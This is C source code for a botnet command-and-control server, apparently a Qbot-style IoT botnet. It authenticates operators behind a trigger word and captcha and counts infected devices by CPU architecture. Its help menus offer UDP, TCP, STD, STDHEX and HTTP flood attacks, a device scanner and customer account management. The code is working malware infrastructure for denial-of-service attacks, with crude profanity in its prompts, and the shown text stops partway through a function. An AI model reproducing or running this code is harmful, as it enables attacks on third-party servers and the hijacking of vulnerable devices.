/*
These bitches love Sosa
C2 writted by s4y :)
*/
char safe_string[] = {"\x45\x42\x4f\x54\x20\x43\x52\x45\x41\x54\x45\x44\x20\x42\x59\x3a\x20\x73\x34\x79\x23\x30\x30\x30\x31"};
#include "includes.h"
#define LOGINTRIGGER "login" //String To Trigger Login Prompt aka real hacker shit by s4y
#define MAXFDS 1000000
char usernamez[80];
int captcano = 1;
int logintrigger = 1;
int bannertype = 0;
int checkfloods = 0;
int adminstatus;
struct login_info {
    char username[100];
    char password[100];
    char type[100];
    int maxseconds;
};
static struct login_info accounts[100];
struct clientdata_t {
    uint32_t ip;
    char x86;
    char mips;
    char mpsl;
    char arm;
    char arm5;
    char arm6;
    char arm7;
    char spc;
    char ppc;
    char m68k;
    char sh4;
    char arc;
    char unk;
    char build[7];
    char joinname[512];
    char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    int adminstatus;
    char nickname[20];
} XXXgements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

FILE *LogFile2;
FILE *LogFile3;

static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
static void checkmyfloods(int datafd)
{
    char botnet[100];

    if(checkfloods == 0)
    {
        sprintf(botnet, "\033[0mfloods: \033[1;32mONLINE\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
    }
    
    if(checkfloods == 1)
    {
        sprintf(botnet, "\033[0mfloods: \033[1;31mOFFLINE\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
    }
}

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd) {
    int flags, s;
    flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl(sfd, F_SETFL, flags);
    if (s == -1) {
        perror("fcntl");
        return -1;
    }
    return 0;
}

static int create_and_bind(char *port) {
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0) {
            break;
        }
        close(sfd);
    }
    if (rp == NULL) {
        fprintf(stderr, "Could not bind\n");
        return -1;
    }
    freeaddrinfo(result);
    return sfd;
}
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
    int total = 0, got = 1;
    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}
void broadcast(char *msg, int us, char *sender) {
    int sendMGM = 1;
    if (strcmp(msg, ".") == 0) sendMGM = 0;
    char *wot = malloc(strlen(msg) + 10);
    memset(wot, 0, strlen(msg) + 10);
    strcpy(wot, msg);
    trim(wot);
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    char *timestamp = asctime(timeinfo);
    trim(timestamp);
    int i;
    for (i = 0; i < MAXFDS; i++) {
        if (i == us || (!clients[i].connected)) continue;
        if (sendMGM && XXXgements[i].connected) {
            send(i, "\033[1;35m", 9, MSG_NOSIGNAL);
            send(i, sender, strlen(sender), MSG_NOSIGNAL);
            send(i, ": ", 2, MSG_NOSIGNAL);
        }
        send(i, msg, strlen(msg), MSG_NOSIGNAL);
        send(i, "\n", 1, MSG_NOSIGNAL);
    }
    free(wot);
}

void *BotEventLoop(void *useless) {
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc(MAXFDS, sizeof event);
    while (1) {
        int n, i;
        n = epoll_wait(epollFD, events, MAXFDS, -1);
        for (i = 0; i < n; i++) {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].arm = 0;
                clients[events[i].data.fd].arm5 = 0;
                clients[events[i].data.fd].arm6 = 0;
                clients[events[i].data.fd].arm7 = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].arc = 0;
                clients[events[i].data.fd].sh4 = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].unk = 0;
                close(events[i].data.fd);
                continue;
            } else if (listenFD == events[i].data.fd) {
                while (1) {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;

                    in_len = sizeof in_addr;
                    infd = accept(listenFD, &in_addr, &in_len);
                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else {
                            perror("accept");
                            break;
                        }
                    }
                    clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
                        if (!clients[ipIndex].connected || ipIndex == infd) continue;
                        if (clients[ipIndex].ip == clients[infd].ip) {
                            dup = 1;
                            break;
                        }
                    }
                    if (dup) {
                        if (send(infd, "!* LOL\n", 13, MSG_NOSIGNAL) == -1) {
                            close(infd);
                            continue;
                        }
                        close(infd);
                        continue;
                    }
                    s = make_socket_non_blocking(infd);
                    if (s == -1) {
                        close(infd);
                        break;
                    }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1) {
                        perror("epoll_ctl");
                        close(infd);
                        break;
                    }
                    clients[infd].connected = 1;
                }
                continue;
            } else {
                int datafd = events[i].data.fd;
                struct clientdata_t *client = &(clients[datafd]);
                int done = 0;
                client->connected = 1;
                client->arm = 0;
                client->arm5 = 0;
                client->arm6 = 0;
                client->arm7 = 0;
                client->mips = 0;
                client->mpsl = 0;
                client->x86 = 0;
                client->arc = 0;
                client->sh4 = 0;
                client->ppc = 0;
                client->unk = 0;
                while (1) {
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
                        if (strstr(buf, "\n") == NULL) {
                            done = 1;
                            break;
                        }
                        trim(buf);
                        if (strcmp(buf, "PING") == 0) {
                            if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) {
                                done = 1;
                                break;
                            }
                            continue;
                        }
                        if (strstr(buf, "REPORT ") == buf) {
                            char *line = strstr(buf, "REPORT ") + 7;
                            fprintf(telFD, "%s\n", line);
                            fflush(telFD);
                            TELFound++;
                            continue;
                        }
                        if (strstr(buf, "PROBING") == buf) {
                            char *line = strstr(buf, "PROBING");
                            scannerreport = 1;
                            continue;
                        }
                        if (strstr(buf, "REMOVING PROBE") == buf) {
                            char *line = strstr(buf, "REMOVING PROBE");
                            scannerreport = 0;
                            continue;
                        }
                        if (strstr(buf, "1") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> x86\n");
                            client->x86 = 1;
                        }
                        if (strstr(buf, "9") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> arc\n");
                            client->arc = 1;
                        }
                        if (strstr(buf, "3") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> mips\n");
                            client->mips = 1;
                        }
                        if (strstr(buf, "4") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> mpsl\n");
                            client->mpsl = 1;
                        }
                        if (strstr(buf, "2") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> arm\n");
                            client->arm = 1;
                        }
                        if (strstr(buf, "5") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> arm5\n");
                            client->arm5 = 1;
                        }
                        if (strstr(buf, "6") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> arm6\n");
                            client->arm6 = 1;
                        }
                        if (strstr(buf, "7") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> arm7\n");
                            client->arm7 = 1;
                        }
                        if (strstr(buf, "8") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> sh4\n");
                            client->sh4 = 1;
                        }
                        if (strstr(buf, "10") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> ppc\n");
                            client->ppc = 1;
                        }
                        if (strstr(buf, "0") == buf) {
                            printf("\033[01;36m[client connected] \033[37m-> unk\n");
                            client->unk = 1;
                        }
                        if (strcmp(buf, "PONG") == 0) {
                            continue;
                        }
                    }
                    if (count == -1) {
                        if (errno != EAGAIN) {
                            done = 1;
                        }
                        break;
                    } else if (count == 0) {
                        done = 1;
                        break;
                    }
                    if (done) {
                        client->connected = 0;
                        client->arm = 0;
                        client->arm5 = 0;
                        client->arm6 = 0;
                        client->arm7 = 0;
                        client->mips = 0;
                        client->mpsl = 0;
                        client->x86 = 0;
                        client->arc = 0;
                        client->sh4 = 0;
                        client->ppc = 0;
                        client->unk = 0;
                        close(datafd);
                    }
                }
            }
        }
    }
}

unsigned int armConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm) continue;
        total++;
    }

    return total;
}

unsigned int arm5Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm5) continue;
        total++;
    }

    return total;
}

unsigned int arm6Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm6) continue;
        total++;
    }

    return total;
}

unsigned int arm7Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm7) continue;
        total++;
    }

    return total;
}

unsigned int mipsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].mips) continue;
        total++;
    }

    return total;
}

unsigned int mpslConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].mpsl) continue;
        total++;
    }

    return total;
}

unsigned int x86Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].x86) continue;
        total++;
    }

    return total;
}

unsigned int arcConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arc) continue;
        total++;
    }

    return total;
}

unsigned int sh4Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].sh4) continue;
        total++;
    }

    return total;
}

unsigned int ppcConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].ppc) continue;
        total++;
    }

    return total;
}

unsigned int unkConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].unk) continue;
        total++;
    }

    return total;
}

unsigned int BotsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].connected) continue;
        total++;
    }
    return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line = 0;
    char temp[512];

    if ((fp = fopen("config.txt", "r")) == NULL) {
        return (-1);
    }
    while (fgets(temp, 512, fp) != NULL) {
        if ((strstr(temp, str)) != NULL) {
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if (fp)
        fclose(fp);
    if (find_result == 0)return 0;
    return find_line;
}
void client_addr(struct sockaddr_in addr) {
  printf("\x1b[31m[\x1b[0m%d.%d.%d.%d\x1b[31m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("IP.log", "a");
  fprintf(logFile, "IP:%d.%d.%d.%d\r\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24,
    usernamez);
  fclose(logFile);
}
void *TitleWriter(void *sock) {
        int datafd = (int) sock;
        char string[2048];
        while (1) {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; %d Devices %c", '\033', BotsConnected(), '\007');
            if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
            sleep(2);
        }
    }
void *BotWorker(void *sock) {
    int datafd = (int) sock;
    int find_line;
    OperatorsConnected++;
    pthread_t title;
    char usernamez[80];
    char buf[2048];
    char *username;
    char *password;
    memset(buf, 0, sizeof buf);
    char botnet[2048];
    memset(botnet, 0, 2048);
    char botcount[2048];
    memset(botcount, 0, 2048);

    FILE *fp;
    int i = 0;
    int c;
    fp = fopen("config.txt", "r");
    while (!feof(fp)) {
        c = fgetc(fp);
        ++i;
    }
    int j = 0;
    rewind(fp);
    while (j != i - 1) {
        fscanf(fp, "%s %s %s %d", accounts[j].username, accounts[j].password, accounts[j].type, &accounts[j].maxseconds);
        ++j;
    }
        char clearscreen [2048];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[1A");
        if(logintrigger == 1)
        {
            if(fdgets(buf, sizeof(buf), datafd) > 2);
            trim(buf);
            send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL);
            if(!strcmp(buf, LOGINTRIGGER))
            {
                if(captcano == 1)
                {
                    goto catpchaprompt;
                }
                else
                {
                    goto loginprompt;
                }

            }
            else
            {
                goto end;
            }
        }
        else
        {
            goto loginprompt;
        }


catpchaprompt:
        memset(buf, 0, sizeof(buf));
        int catpcha_number = rand() % 9999;
        char sendcatpcha[1024];

        sprintf(sendcatpcha, "captcha (%d)\r\ninput: ", catpcha_number);
        send(datafd, sendcatpcha, strlen(sendcatpcha), MSG_NOSIGNAL); // i see whats happening
        if(fdgets(buf, sizeof(buf), datafd) > 2); // wtf this makes no sense
        trim(buf);
        printf("test: %s length: %d\n", buf, strlen(buf));
        if(atoi(buf) == catpcha_number)
            goto loginprompt;
        else
            goto end;
loginprompt:
    memset(buf, 0, sizeof(buf));
    char user [5000];   

    sprintf(user, "\033[0mпользователь\033[01;37m:\033[0m ");

    if (send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, datafd) < 1) goto end;
    trim(buf);
    char *nickstring;
    sprintf(accounts[find_line].username, buf);
    sprintf(usernamez, buf);
    nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
    if (strcmp(nickstring, accounts[find_line].username) == 0) {
        char password[5000];
        if (send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\r\n\033[0mпроходят\033[01;37m:\033[30m ", accounts[find_line].username);
        if (send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;

        if (fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);

        char correct1[5000];

        sprintf(correct1,  "\r\n\033[mПопытка авторизации!\r\n", accounts[find_line].username);

        if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, correct1, strlen(correct1), MSG_NOSIGNAL) == -1) goto end;
        sleep (1);

        goto Banner;
    }

    failed:
    if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        char failed_line1[80];
        char ascii_failed_line1  [80];
        char ascii_failed_line2  [80];
        char ascii_failed_line3  [80];
        char ascii_failed_line4  [80];
        char ascii_failed_line5  [80];
        char ascii_failed_line6  [80];
        char ascii_failed_line7  [80];
        char ascii_failed_line8  [80];
        char ascii_failed_line9  [80];
        char ascii_failed_line10 [80];

        sprintf(ascii_failed_line1,  "\x1b[31m................/´¯/)..........\r\n");
        sprintf(ascii_failed_line2,  "\x1b[31m..............,/¯../........... \r\n");
        sprintf(ascii_failed_line3,  "\x1b[31m............./..../ ...........\r\n");
        sprintf(ascii_failed_line4,  "\x1b[31m......./´¯/'...'/´¯¯`·¸........\r\n");
        sprintf(ascii_failed_line5,  "\x1b[31m..../'/.../..../......./¨¯\ ...\r\n");
        sprintf(ascii_failed_line6,  "\x1b[31m..('(...´...´.... ¯~/'...') ...\r\n");
        sprintf(ascii_failed_line7,  "\x1b[31m...\.................'...../ ..\r\n");
        sprintf(ascii_failed_line8,  "\x1b[31m....''...\.......... _.·´ .....\r\n");
        sprintf(ascii_failed_line9,  "\x1b[31m......\..............( ........\r\n");
        sprintf(ascii_failed_line10, "\x1b[31m........\.............\........\r\n");
        
        sprintf(failed_line1,        "\r\n\x1b[31mхорошая попытка сука!\r\n");
        
        if(send(datafd, ascii_failed_line1,  strlen(ascii_failed_line1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line2,  strlen(ascii_failed_line2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line3,  strlen(ascii_failed_line3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line4,  strlen(ascii_failed_line4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line5,  strlen(ascii_failed_line5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line6,  strlen(ascii_failed_line6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line7,  strlen(ascii_failed_line7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line8,  strlen(ascii_failed_line8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line9,  strlen(ascii_failed_line9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_failed_line10, strlen(ascii_failed_line10), MSG_NOSIGNAL) == -1) goto end;
        
        if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
        sleep(5);
        goto end;
    
    Banner:
    pthread_create(&title, NULL, &TitleWriter, sock);
    sprintf(XXXgements[datafd].nickname, "%s", accounts[find_line].username);
    if(!strcmp(accounts[find_line].type, "admin"))
        {
            XXXgements[datafd].adminstatus = 1;
            broadcast(buf, datafd, accounts[find_line].username);
            printf("\x1b[0m[ebot-ADMIN] (%s) logged in\n", accounts[find_line].username);
        }
        else
        {
            XXXgements[datafd].adminstatus = 0;
            broadcast(buf, datafd, accounts[find_line].username);
            printf("\x1b[0m[ebot-USER] (%s) logged in\n", accounts[find_line].username);
        }

        char banner1lol1[5000];
        char ascii_banner_line20 [5000];
        char ascii_banner_line21 [5000];
        char ascii_banner_line22 [5000];
        char ascii_banner_line23 [5000];
        char ascii_banner_line24 [5000];
        char ascii_banner_line25 [5000];
        char ascii_banner_line26 [5000];
                sprintf(banner1lol1, "\033[0m\033[2J\033[1;1H");
                sprintf(ascii_banner_line20, "                \033[0;96m    ██████\033[0;97m╗ \033[0;96m██\033[0;97m╗ •\033[0;96m██\033[0;97m╗ \033[0;96m█████\033[0;97m╗ \033[0;96m███\033[0;97m╗ ▪ \033[0;96m███\033[0;97m╗\033[0;96m██\033[0;97m╗   \r\n");
                sprintf(ascii_banner_line21, "                \033[0;96m▪  ██\033[0;97m╔═══\033[0;96m██\033[0;97m╗\033[0;96m██\033[0;97m║ \033[0;96m██\033[0;97m╔╝\033[0;96m██\033[0;97m╔══\033[0;96m██\033[0;97m╗\033[0;96m████\033[0;97m╗ \033[0;96m████\033[0;97m║\033[0;96m██\033[0;97m║.▪ \r\n");
                sprintf(ascii_banner_line22, "                \033[0;96m   ██\033[0;97m║ . \033[0;96m██\033[0;97m║\033[0;96m█████\033[0;97m╔╝ \033[0;96m███████\033[0;97m║\033[0;96m██\033[0;97m╔\033[0;96m████\033[0;97m╔\033[0;96m██\033[0;97m║\033[0;96m██\033[0;97m║   \r\n");
                sprintf(ascii_banner_line23, "                \033[0;96m   ██\033[0;97m║   \033[0;96m██\033[0;97m║\033[0;96m██\033[0;97m╔═\033[0;96m██\033[0;97m╗ \033[0;96m██\033[0;97m╔══\033[0;96m██\033[0;97m║\033[0;96m██\033[0;97m║╚\033[0;96m██\033[0;97m╔╝\033[0;96m██\033[0;97m║\033[0;96m██\033[0;97m║   \r\n");
                sprintf(ascii_banner_line24, "                \033[0;97m  •╚\033[0;96m██████\033[0;97m╔╝\033[0;96m██\033[0;97m║  \033[0;96m██\033[0;97m╗\033[0;96m██\033[0;97m║. \033[0;96m██\033[0;97m║\033[0;96m██\033[0;97m║ ╚═╝ \033[0;96m██\033[0;97m║\033[0;96m██\033[0;97m║   \r\n");
                sprintf(ascii_banner_line25, "                \033[0;97m    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ▪· ╚═╝╚═╝   \r\n");
                if (send(datafd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
                if (send(datafd, banner1lol1, strlen(banner1lol1), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_banner_line23, strlen(ascii_banner_line23), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_banner_line24, strlen(ascii_banner_line24), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii_banner_line25, strlen(ascii_banner_line25), MSG_NOSIGNAL) == -1) goto end;
    while (1) {
        char input[5000];
        sprintf(input, "\033[0mbotnet ~$ \033[0m", accounts[find_line].username, usernamez);
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        break;
    }
    XXXgements[datafd].connected = 1;

    while (fdgets(buf, sizeof buf, datafd) > 0) {
        if (strncmp(buf, "awfh", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "?", 1) == 0 ||
            strncmp(buf, "methods", 4) == 0) {
            
                char ddosline1  [200];
                char ddosline2  [200];
                char ddosline3  [200];
                char ddosline4  [200];
                                char ddosline5  [200];
                char ddosline12  [200];

                sprintf(ddosline1, "\033[0;96m !* UDP [IP] [PORT] [TIME] 32 1337 400 |\033[0;37m UDP FLOOD\r\n");
                sprintf(ddosline2, "\033[0;96m !* STD [IP] [PORT] [TIME] |\033[0;37m STD FLOOD\r\n");
                sprintf(ddosline3, "\033[0;96m !* TCP [IP] [PORT] [TIME] 32 all 1337 400 |\033[0;37m TCP FLOOD\r\n");
                sprintf(ddosline4, "\033[0;96m !* STDHEX [IP] [PORT] [TIME] |\033[0;37m STDHEX FLOOD\r\n");
                                sprintf(ddosline5, "\033[0;96m !* HTTP [IP] [PORT] / [TIME] 1-999|\033[0;37m HTTP FLOOD\r\n");
                sprintf(ddosline12, "\033[0;96m !* STOP |\033[0;37m KILLS ALL ATTACKS\r\n");

                if(send(datafd, ddosline1,  strlen(ddosline1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ddosline2,  strlen(ddosline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ddosline3,  strlen(ddosline3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ddosline4,  strlen(ddosline4),   MSG_NOSIGNAL) == -1) goto end;
                                if(send(datafd, ddosline5,  strlen(ddosline5),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ddosline12,  strlen(ddosline12), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strncmp(buf, "admin", 4) == 0 || strncmp(buf, "ADMIN", 4) == 0 || strncmp(buf, "Admin", 1) == 0 ||
            strncmp(buf, "stuff", 4) == 0) {
            char asd[500];
            char a4[5000];
            char a5[5000];
            char hspace1[5000];
            char hp0[5000];
            char hp1[5000];
            char hp2[5000];
            char hp3[5000];
            char hp4[5000];
            char hspace[5000];
            char hp5[5000];
            char hp6[5000];
            char hp7[5000];
            char hp8[5000];

            sprintf(asd, "\033[0m\r\n");
            sprintf(a4,  "\033[01;36mbots\033[37m: \033[0mshows the amount of connected clients.\r\n");
            sprintf(a5,  "\033[01;36mbotkill\033[37m: \033[0mkills all duplicated clients.\r\n");
            sprintf(hspace1, "\033[0m\r\n");
            sprintf(hp0, "\033[01;36madduser\033[37m: \033[0madds new client credentials.\r\n");
            sprintf(hp1,  "\033[01;36mremove\033[37m: \033[0mremoves user from datase.\r\n");
            sprintf(hp2,  "\033[01;36monline\033[37m: \033[0mshows all users currently connected to c2.\r\n");
            sprintf(hp3,  "\033[01;36mkick user=\033[37m: \033[0mforce quits customers cnc session.\r\n");
            sprintf(hp4,  "\033[01;36mipban <add/del>\033[37m: \033[0madds or deletes ips from iptables.\r\n");
            sprintf(hspace, "\033[0m\r\n");
            sprintf(hp5,  "\033[01;36mscan <enable/disable>\033[37m: \033[0menable and disables bot scanner.\r\n");
            sprintf(hp6,  "\033[01;36mflood <enable/disable>\033[37m: \033[0menables and disables attack launching.\r\n");
            sprintf(hp7,  "\033[01;36mcaptcha <enable/disable>\033[37m: \033[0menables and disables login captcha.\r\n");
            sprintf(hp8,  "\033[01;36mtrigger <enable/disable>\033[37m: \033[0menables and disables login trigger.\r\n");

            if (send(datafd, asd, strlen(asd), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, a4, strlen(a4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, a5, strlen(a5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hspace1, strlen(hspace1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp0, strlen(hp0), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp1, strlen(hp1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp2, strlen(hp2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp3, strlen(hp3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp4, strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hspace, strlen(hspace), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp5, strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp6, strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp7, strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp8, strlen(hp8), MSG_NOSIGNAL) == -1) goto end;
        }

        if(strstr(buf, "bots"))
        {
            char bots1[128];
            char bots2[128];
            char bots3[128];
            char bots4[128];
            char bots5[128];

            sprintf(bots1, "\033[0muse 'os -a' to display all bot information.\r\n");
            sprintf(bots2, "\r\n");
            sprintf(bots3, "\033[0mconnected devices: \033[37m%d \r\n",     BotsConnected());
            sprintf(bots4, "\033[0mconnected admins: \033[37m%d \r\n", OperatorsConnected);
            sprintf(bots5, "\033[0mdevice selfrep: \033[37mACTIVE \r\n");

            if (send(datafd, bots1, strlen(bots1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, bots2, strlen(bots2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, bots3, strlen(bots3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, bots4, strlen(bots4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, bots5, strlen(bots5), MSG_NOSIGNAL) == -1) goto end;
        }
        if(strstr(buf, "os -a") || strstr(buf, "clients -a") || strstr(buf, "arch -a")) {
            char booters1[128];
            char booters2[128];
            char booters3[128];
            char booters4[128];
            char booters5[128];
            char booters6[128];
            char booters7[128];
            char booters8[128];
            char booters9[128];
            char booters10[128];
            char booters11[128];
        
            if(x86Connected() != 0)
            {
                sprintf(booters1,"\033[0m.x86\033[90m: \033[37;1m%d\r\n",     x86Connected());
                if(send(datafd, booters1, strlen(booters1), MSG_NOSIGNAL) == -1) goto end;
            }
            if(armConnected() != 0)
            {
                sprintf(booters2,"\033[0m.arm\033[90m: \033[37;1m%d\r\n",     armConnected());
                if(send(datafd, booters2, strlen(booters2), MSG_NOSIGNAL) == -1) goto end;
            }
            if(arm5Connected() != 0)
            {
                sprintf(booters3,"\033[0m.arm5\033[90m: \033[37;1m%d\r\n",     arm5Connected());
                if(send(datafd, booters3, strlen(booters3), MSG_NOSIGNAL) == -1) goto end;
            }
            if(arm6Connected() != 0)
            {
                sprintf(booters4,"\033[0m.arm6\033[90m: \033[37;1m%d\r\n",     arm6Connected());
                if(send(datafd, booters4, strlen(booters4), MSG_NOSIGNAL) == -1) goto end;
            }
            if(arm7Connected() != 0)
            {
                sprintf(booters5,"\033[0m.arm7\033[90m: \033[37;1m%d\r\n",     arm7Connected());
                if(send(datafd, booters5, strlen(booters5), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mipsConnected() != 0)
            {
                sprintf(booters6,"\033[0m.mips\033[90m: \033[37;1m%d\r\n",     mipsConnected());
                if(send(datafd, booters6, strlen(booters6), MSG_NOSIGNAL) == -1) goto end;
            }
